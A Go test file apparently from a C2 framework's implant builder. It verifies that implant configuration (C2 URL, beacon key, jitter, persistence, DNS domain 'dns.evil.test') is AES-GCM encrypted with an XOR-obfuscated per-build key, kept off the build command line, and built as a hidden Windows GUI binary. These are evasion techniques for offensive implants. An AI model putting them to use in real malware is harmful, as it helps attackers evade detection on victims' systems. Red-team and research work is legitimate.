package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// recoverBlobKeyHex decodes the strxor-encoded per-build SConfigKey (exactly as
// the agent's mustDecrypt does) back into the raw AES-256 key hex.
func recoverBlobKeyHex(sConfigKey string) (string, bool) {
	idx := -1
	for i := 0; i+1 <= len(sConfigKey); i++ {
		if sConfigKey[i] == ':' {
			idx = i
			break
		}
	}
	if idx < 0 {
		return "", false
	}
	xorKey, err := hex.DecodeString(sConfigKey[:idx])
	if err != nil {
		return "", false
	}
	data, err := base64.StdEncoding.DecodeString(sConfigKey[idx+1:])
	if err != nil {
		return "", false
	}
	if len(xorKey) != len(data) {
		return "", false
	}
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ xorKey[i]
	}
	return string(out), true
}

// decodeBlobForTest mirrors the agent's decryptConfigBlob (AES-256-GCM with the
// per-build key recovered from sConfigKey) so we can validate the produced blob
// round-trips. No static/shared key exists anymore — every build uses a unique
// key delivered via strxor.
func decodeBlobForTestKeyed(blob, keyHex string) ([]byte, bool) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, false
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, false
	}
	raw, err := base64.StdEncoding.DecodeString(blob)
	if err != nil || len(raw) < gcm.NonceSize() {
		return nil, false
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, false
	}
	return plain, true
}

func TestBuildConfigBlobCarriesMalleableWrapping(t *testing.T) {
	cfg := ImplantConfig{
		C2URL:            "http://10.0.0.9:9999",
		Protocol:         "http",
		MalleablePrepend: "<html><body>",
		MalleableAppend:  "</body></html>",
	}
	blob, sConfigKey := buildConfigBlobKeyed(cfg, defaultMalleableProfile())
	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("failed to recover per-build key")
	}
	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
	if !ok {
		t.Fatal("blob did not decode")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatalf("blob json: %v", err)
	}
	if got.MalleablePrepend != "<html><body>" {
		t.Errorf("MalleablePrepend not carried: %q", got.MalleablePrepend)
	}
	if got.MalleableAppend != "</body></html>" {
		t.Errorf("MalleableAppend not carried: %q", got.MalleableAppend)
	}
}

func TestBuildConfigBlobRoundTrip(t *testing.T) {
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:         "http://10.0.0.9:9999",
		Protocol:      "http",
		Interval:      33,
		Jitter:        15,
		UserAgent:     "UA/1.0",
		Persist:       true,
		SkipTLSVerify: true,
		BeaconKey:     "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
		ListenerID:    4,
		DNSDomain:     "dns.evil.test",
	}

	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	if blob == "" || sConfigKey == "" {
		t.Fatal("buildConfigBlobKeyed returned empty")
	}

	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("failed to recover per-build key")
	}
	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
	if !ok {
		t.Fatal("blob did not decode in the agent's xor format")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatalf("decoded blob is not valid JSON: %v", err)
	}

	if got.C2URL != cfg.C2URL {
		t.Errorf("C2URL mismatch: got %q want %q", got.C2URL, cfg.C2URL)
	}
	if got.Interval != "33" {
		t.Errorf("Interval mismatch: got %q want %q", got.Interval, "33")
	}
	if got.Jitter != "15" {
		t.Errorf("Jitter mismatch: got %q want %q", got.Jitter, "15")
	}
	if got.BeaconKey != cfg.BeaconKey {
		t.Errorf("BeaconKey mismatch")
	}
	if got.Persist != "true" {
		t.Errorf("Persist mismatch: got %q", got.Persist)
	}
	if got.SkipTLSVerify != "true" {
		t.Errorf("SkipTLSVerify mismatch: got %q", got.SkipTLSVerify)
	}
	if got.DNSDomain != cfg.DNSDomain {
		t.Errorf("DNSDomain mismatch")
	}
	// The obfuscated blob must not leak plaintext config values.
	for _, leaked := range []string{cfg.BeaconKey, cfg.DNSDomain} {
		if containsString(blob, leaked) {
			t.Errorf("blob leaks plaintext %q", leaked)
		}
	}
}

func containsString(haystack, needle string) bool {
	return len(haystack) > 0 && len(needle) > 0 && indexOf(haystack, needle) >= 0
}

func indexOf(s, sub string) int {
	n := len(s)
	m := len(sub)
	for i := 0; i+m <= n; i++ {
		if s[i:i+m] == sub {
			return i
		}
	}
	return -1
}

func TestBuildLdflagsUsesSingleConfigBlob(t *testing.T) {
	profile := defaultMalleableProfile()
	profile.BeaconURI = "/api/v1/beacon"
	cfg := ImplantConfig{
		C2URL:     "http://10.1.1.5:8080",
		Protocol:  "http",
		Interval:  10,
		Jitter:    20,
		BeaconKey: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
		SelfCheck: true,
	}

	ldflags, blob, sConfigKey := buildLdflags(cfg, profile, "windows")

	// The config blob and its key are delivered via a generated temp source
	// file (writeConfigInjectFile), NOT the go build argv (B2), so they must
	// NOT appear in ldflags.
	if containsString(ldflags, `-X "main.ConfigBlob=`) {
		t.Fatalf("ConfigBlob must not be on the build argv: %s", ldflags)
	}
	if containsString(ldflags, `-X "main.SConfigKey=`) {
		t.Fatalf("SConfigKey must not be on the build argv: %s", ldflags)
	}
	// The self-check placeholder must also stay off the argv: with -X, Go
	// records the value in the build info section, producing a second copy
	// that patchSelfCheckHash cannot distinguish from the real variable.
	if containsString(ldflags, `-X "main.SelfCheckSHA256Str=`) || containsString(ldflags, selfCheckPlaceholder) {
		t.Fatalf("SelfCheckSHA256Str must not be on the build argv: %s", ldflags)
	}
	if blob == "" || sConfigKey == "" {
		t.Fatalf("buildLdflags returned empty blob/key: blob=%q sKey=%q", blob, sConfigKey)
	}
	// No more per-field ldflags for config values.
	for _, old := range []string{"main.C2URL=", "main.BeaconKeyStr=", "main.IntervalStr=", "main.SSHHostKeyStr="} {
		if containsString(ldflags, old) {
			t.Errorf("legacy ldflags injection %q still present in %s", old, ldflags)
		}
	}
	// Windows GUI flag preserved.
	if !containsString(ldflags, "-H=windowsgui") {
		t.Errorf("windowsgui flag missing: %s", ldflags)
	}
	// Linux must NOT include windowsgui.
	ldflagsLinux, _, _ := buildLdflags(cfg, profile, "linux")
	if containsString(ldflagsLinux, "-H=windowsgui") {
		t.Errorf("linux build should not include -H=windowsgui")
	}
	if !containsString(ldflags, "-buildid=") {
		t.Errorf("buildid flag missing")
	}
}

// TestWriteConfigInjectFile verifies the B2 secret-delivery mechanism: the
// per-build config blob and key are emitted into an ephemeral init() source file
// (and never the build argv).
func TestWriteConfigInjectFile(t *testing.T) {
	dir := t.TempDir()
	if err := writeConfigInjectFile(dir, "BASE64BLOB==", "ab:cd", true); err != nil {
		t.Fatalf("writeConfigInjectFile: %v", err)
	}
	// Filename is randomized per build (aa_*_inject.go, always sorting before
	// agent.go); locate it via glob instead of a fixed name.
	matches, err := filepath.Glob(filepath.Join(dir, "aa_*_inject.go"))
	if err != nil || len(matches) != 1 {
		t.Fatalf("expected exactly one inject file, got %v (err=%v)", matches, err)
	}
	if base := filepath.Base(matches[0]); strings.Compare(base, "agent.go") >= 0 {
		t.Fatalf("inject file %s must sort before agent.go for init() ordering", base)
	}
	data, err := os.ReadFile(matches[0])
	if err != nil {
		t.Fatalf("inject file not written: %v", err)
	}
	src := string(data)
	if !strings.Contains(src, "func init() {") {
		t.Errorf("inject file missing init(): %s", src)
	}
	if !strings.Contains(src, `ConfigBlob = "BASE64BLOB=="`) {
		t.Errorf("inject file missing ConfigBlob assignment: %s", src)
	}
	if !strings.Contains(src, `SConfigKey = "ab:cd"`) {
		t.Errorf("inject file missing SConfigKey assignment: %s", src)
	}
	if !strings.Contains(src, `SelfCheckSHA256Str = "`+selfCheckPlaceholder+`"`) {
		t.Errorf("inject file missing self-check placeholder assignment: %s", src)
	}
	// Empty secrets and no self-check must be a no-op (no file written,
	// defaults stand).
	emptyDir := t.TempDir()
	if err := writeConfigInjectFile(emptyDir, "", "", false); err != nil {
		t.Fatalf("writeConfigInjectFile(empty): %v", err)
	}
	if _, err := os.Stat(filepath.Join(emptyDir, "aa_config_inject.go")); err == nil {
		t.Errorf("empty secrets should not write an inject file")
	}
	// Self-check alone still needs the generated file: the placeholder must
	// come from source, never from -X.
	selfDir := t.TempDir()
	if err := writeConfigInjectFile(selfDir, "", "", true); err != nil {
		t.Fatalf("writeConfigInjectFile(self-check): %v", err)
	}
	selfMatches, err := filepath.Glob(filepath.Join(selfDir, "aa_*_inject.go"))
	if err != nil || len(selfMatches) != 1 {
		t.Fatalf("expected exactly one self-check inject file, got %v (err=%v)", selfMatches, err)
	}
	selfSrc, err := os.ReadFile(selfMatches[0])
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(selfSrc), `SelfCheckSHA256Str = "`+selfCheckPlaceholder+`"`) {
		t.Errorf("self-check-only inject file missing placeholder: %s", selfSrc)
	}
}

// TestBuildConfigBlobKeyedRoundTrip validates the per-build key contract: the
// blob produced by buildConfigBlobKeyed decrypts with the AES key recovered from
// the strxor-encoded sConfigKey exactly as the agent does (mustDecrypt + AES-GCM).
func TestBuildConfigBlobKeyedRoundTrip(t *testing.T) {
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:     "http://10.2.2.7:8443",
		Protocol:  "http",
		Interval:  17,
		Jitter:    9,
		BeaconKey: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
	}
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	if blob == "" || sConfigKey == "" {
		t.Fatal("buildConfigBlobKeyed returned empty")
	}

	// Replicate the agent's strxor decode (mustDecrypt) to recover the hex key.
	idx := -1
	for i := 0; i+1 <= len(sConfigKey); i++ {
		if sConfigKey[i] == ':' {
			idx = i
			break
		}
	}
	if idx < 0 {
		t.Fatal("sConfigKey missing separator")
	}
	xorKey, err := hex.DecodeString(sConfigKey[:idx])
	if err != nil {
		t.Fatalf("xor key decode: %v", err)
	}
	data, err := base64.StdEncoding.DecodeString(sConfigKey[idx+1:])
	if err != nil {
		t.Fatalf("data decode: %v", err)
	}
	if len(xorKey) != len(data) {
		t.Fatalf("xor key/data length mismatch %d vs %d", len(xorKey), len(data))
	}
	aesKeyHexBytes := make([]byte, len(data))
	for i := range data {
		aesKeyHexBytes[i] = data[i] ^ xorKey[i]
	}
	aesKey, err := hex.DecodeString(string(aesKeyHexBytes))
	if err != nil {
		t.Fatalf("aes key hex decode: %v", err)
	}
	if len(aesKey) != 32 {
		t.Fatalf("aes key length %d, want 32", len(aesKey))
	}

	// AES-256-GCM decrypt the blob with the recovered key (agent contract).
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		t.Fatalf("aes newcipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatalf("gcm: %v", err)
	}
	raw, err := base64.StdEncoding.DecodeString(blob)
	if err != nil || len(raw) < gcm.NonceSize() {
		t.Fatal("blob decode")
	}
	plain, err := gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
	if err != nil {
		t.Fatalf("gcm open (agent would fail to decrypt): %v", err)
	}
	var got agentConfigJSON
	if err := json.Unmarshal(plain, &got); err != nil {
		t.Fatalf("json: %v", err)
	}
	if got.C2URL != cfg.C2URL {
		t.Errorf("C2URL mismatch: got %q want %q", got.C2URL, cfg.C2URL)
	}
	if got.BeaconKey != cfg.BeaconKey {
		t.Errorf("BeaconKey mismatch")
	}

	// Distinct builds must use distinct keys (no fleet-wide constant remains).
	_, sConfigKey2 := buildConfigBlobKeyed(cfg, profile)
	if sConfigKey2 == sConfigKey {
		t.Errorf("per-build keys must differ between builds")
	}
}

// TestConfigBlobCarriesBeaconRandomization pins that the heartbeat
// randomization mode and its per-beacon delay cap survive the AES-GCM blob
// round-trip: the agent's initBeaconRandomization() and MaxRandomIntervalMs
// depend on these exact JSON keys, so a dropped field would silently revert
// every implant to plain linear jitter.
func TestConfigBlobCarriesBeaconRandomization(t *testing.T) {
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:               "https://c2.example",
		Interval:            30,
		Jitter:              25,
		BeaconRandomization: "gaussian",
		MaxRandomIntervalMs: 5000,
	}
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	if blob == "" || sConfigKey == "" {
		t.Fatal("buildConfigBlobKeyed returned empty")
	}
	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("sConfigKey decode failed")
	}
	aesKey, err := hex.DecodeString(keyHex)
	if err != nil || len(aesKey) != 32 {
		t.Fatalf("aes key: len=%d err=%v", len(aesKey), err)
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		t.Fatalf("aes newcipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatalf("gcm: %v", err)
	}
	raw, err := base64.StdEncoding.DecodeString(blob)
	if err != nil || len(raw) < gcm.NonceSize() {
		t.Fatal("blob decode")
	}
	plain, err := gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
	if err != nil {
		t.Fatalf("gcm open: %v", err)
	}
	var got agentConfigJSON
	if err := json.Unmarshal(plain, &got); err != nil {
		t.Fatalf("json: %v", err)
	}
	if got.BeaconRandomization != "gaussian" {
		t.Errorf("BeaconRandomization = %q, want gaussian", got.BeaconRandomization)
	}
	if got.MaxRandomIntervalMs != "5000" {
		t.Errorf("MaxRandomIntervalMs = %q, want 5000", got.MaxRandomIntervalMs)
	}
}
